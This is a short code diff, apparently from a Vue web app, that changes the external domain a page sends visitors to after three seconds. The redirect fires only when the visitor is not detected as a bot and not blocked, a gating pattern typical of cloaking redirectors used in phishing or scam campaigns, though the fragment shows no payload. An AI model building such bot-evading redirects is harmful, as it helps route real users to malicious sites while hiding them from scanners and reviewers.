@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://trol.fauxmacho.com/';
+          window.location.href = 'https://om.desario.com.br/';
         }, 3000);
       }
 
